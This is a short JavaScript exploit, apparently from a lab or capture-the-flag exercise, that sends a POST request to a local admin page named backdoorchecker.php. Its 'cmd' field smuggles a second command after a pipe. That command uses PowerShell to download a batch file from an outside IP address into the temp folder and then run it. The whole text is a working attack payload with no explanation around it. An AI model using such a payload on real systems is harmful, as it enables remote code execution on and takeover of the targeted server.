var x = new XMLHttpRequest();
var payload  = 'powershell -c "wget http://192.168.206.139/gecko.bat -OutFile $env:temp\\gecko.bat" ; %temp%\\gecko.bat';
var params = 'cmd=dir | ' + payload;

x.open('POST','http://localhost/admin/backdoorchecker.php',true);
x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
x.send(params);
